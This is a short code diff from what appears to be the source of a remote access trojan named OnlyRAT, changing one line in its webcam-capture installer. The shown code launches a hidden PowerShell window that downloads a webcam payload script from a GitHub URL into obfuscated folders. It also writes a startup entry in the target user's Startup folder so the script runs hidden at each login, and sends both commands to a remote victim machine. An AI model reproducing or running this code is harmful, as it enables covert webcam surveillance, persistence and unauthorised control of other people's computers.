@@ -353,7 +353,7 @@ def cli(arguments):
                 print("\n[*] Installing webcam capture...")
 
                 install_webcam = f"powershell powershell.exe -windowstyle hidden \"Invoke-WebRequest -Uri raw.githubusercontent.com/CosmodiumCS/OnlyRAT/main/payloads/webcam.ps1 -OutFile {working_direcory}/bNOEXCxyVp/LIspiXrVAu.ps1\""
-                add_to_startup = f"cd C:/Users/{target_username}/AppData/Roaming/Microsoft/Windows && cd \"Start Menu\" && cd Programs/Startup && echo powershell cd $env:temp; Start-Process powershell.exe -windowstyle hidden $env:temp/bNOEXCxyVp/LIspiXrVAu.ps1 >> GiLqXiexKP.cmd"
+                add_to_startup = f"cd C:/Users/{target_username}/AppData/Roaming/Microsoft/Windows && cd \"Start Menu\" && cd Programs/Startup && echo powershell cd $env:temp/bNOEXCxyVp; Start-Process powershell.exe -windowstyle hidden $env:temp/bNOEXCxyVp/LIspiXrVAu.ps1 >> GiLqXiexKP.cmd"
 
                 remote_command(ipv4, password, install_webcam)
                 remote_command(ipv4, password, add_to_startup)
